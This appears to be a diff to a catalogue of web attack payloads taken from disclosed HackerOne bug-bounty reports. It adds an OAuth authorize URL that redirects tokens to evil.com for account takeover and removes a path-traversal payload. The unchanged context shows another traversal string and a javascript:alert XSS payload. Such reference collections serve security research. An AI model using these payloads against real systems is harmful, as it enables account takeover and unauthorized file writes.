@@ -538,6 +538,15 @@ metadata:
 
 — [Ingress nginx annotation injection causes arbitrary command execution](https://hackerone.com/reports/1728174) · Kubernetes · [suanve](https://hackerone.com/suanve) · $2,500.0
 
+### `c9992da1`
+
+```
+https://target.com/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fevil.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter
+```
+
+**Parameter:** `redirect_uri`
+— [Account takeover due to insufficient URL validation on RelayState parameter](https://hackerone.com/reports/1923672) · GitLab · [bull](https://hackerone.com/bull) · $2,450.0
+
 ### `42c68f0e`
 
 ```
@@ -1092,15 +1101,6 @@ https://target.com/web/sign-inhttps://target.com/javascript:alert(1
 
 ```
 ../../../../../../../../../../tmp/malicious
-```
-
-**Parameter:** `name`
-— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0
-
-### `2be3302c`
-
-```
-../gems/rack
 ```
 
 **Parameter:** `name`
